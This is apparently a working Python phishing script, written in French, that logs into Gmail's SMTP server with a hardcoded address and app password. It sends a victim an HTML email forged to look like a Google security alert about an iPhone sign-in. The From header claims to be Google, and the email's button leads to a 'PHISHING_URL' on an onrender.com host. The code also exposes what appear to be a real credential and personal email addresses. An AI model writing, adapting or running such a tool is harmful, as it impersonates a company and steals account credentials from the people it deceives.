import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from datetime import datetime

# ===== CONFIGURATION =====
SMTP_SERVER  = "smtp.gmail.com"
SMTP_PORT    = 587
SENDER_EMAIL = "mesquin366@gmail.com"
APP_PASSWORD = "gzan fsrt doyl nfxs"  # 🔑 REMPLACEZ PAR VOTRE MOT DE PASSE (sans espaces)

PHISHING_URL = "https://google-p3e0.onrender.com/check-activity"
VICTIM_EMAIL = "maestromaes18@gmail.com"
# =========================

def send_google_alert():
    current_date = datetime.now().strftime("%d %B").lower()
    
    html = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>Alerte Google</title>
    </head>
    <body style="margin:0; padding:0; background:#f4f4f4; font-family:Roboto, Arial, sans-serif;">
        <div style="max-width:600px; margin:0 auto; background:#fff; border-radius:8px; overflow:hidden; box-shadow:0 1px 4px rgba(0,0,0,0.1);">
            <div style="padding:24px 24px 0 24px;">
                <span style="font-size:24px; font-weight:500;">
                    <span style="color:#4285f4;">G</span><span style="color:#ea4335;">o</span><span style="color:#fbbc05;">o</span><span style="color:#4285f4;">g</span><span style="color:#34a853;">l</span><span style="color:#ea4335;">e</span>
                </span>
                <h1 style="font-size:20px; font-weight:500; color:#202124; margin:16px 0 4px 0;">Alerte de sécurité</h1>
                <p style="font-size:14px; color:#5f6368; margin:0 0 24px 0;">{current_date}</p>
            </div>
            <div style="padding:0 24px 24px 24px;">
                <div style="font-size:16px; font-weight:500; color:#202124; margin-bottom:12px;">
                    Nouvelle connexion depuis un Apple iPhone
                </div>
                <div style="background:#f8f9fa; border:1px solid #e0e0e0; border-radius:8px; padding:12px 16px; margin:16px 0; text-align:center; font-size:16px; font-weight:500; color:#202124;">
                    {VICTIM_EMAIL}
                </div>
                <p style="font-size:14px; color:#202124; line-height:1.5; margin:16px 0;">
                    Nous avons détecté une nouvelle connexion à votre compte Google depuis un Apple iPhone.<br>
                    Si c'était vous, aucune action de votre part n'est requise. Dans le cas contraire, nous vous aiderons à sécuriser votre compte.
                </p>
                <div style="margin:24px 0; text-align:center;">
                    <a href="{PHISHING_URL}" style="display:inline-block; background:#1a73e8; color:#fff; text-decoration:none; font-weight:500; padding:10px 24px; border-radius:4px;">Consulter l'activité</a>
                </div>
                <div style="font-size:12px; color:#5f6368; margin-top:24px;">
                    Vous pouvez aussi voir l'activité liée à la sécurité de votre compte ici :<br>
                    <a href="https://myaccount.google.com/notifications" style="color:#1a73e8; text-decoration:none;">https://myaccount.google.com/notifications</a>
                </div>
            </div>
            <div style="padding:20px 24px; font-size:11px; color:#5f6368; border-top:1px solid #e0e0e0; background:#f8f9fa;">
                <p>Cet e-mail vous a été envoyé pour vous informer de modifications importantes apportées à votre compte et aux services Google que vous utilisez.</p>
                <p style="margin-top:12px;">© 2026 Google LLC | 1601 Amphitheatre Parkway, Mountain View, CA 94043 USA</p>
            </div>
        </div>
    </body>
    </html>
    """

    msg = MIMEMultipart("alternative")
    msg["Subject"] = "Alerte de sécurité : Nouvelle connexion détectée"
    msg["From"]    = "Google <no-reply@accounts.google.com>"
    msg["To"]      = VICTIM_EMAIL
    msg.attach(MIMEText(html, "html"))

    try:
        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
            server.ehlo()
            server.starttls()
            server.login(SENDER_EMAIL, APP_PASSWORD.replace(" ", ""))  # enlève les espaces
            server.send_message(msg)
            print("✅ Email envoyé avec succès !")
    except Exception as e:
        print(f"❌ Erreur : {e}")

if __name__ == "__main__":
    send_google_alert()
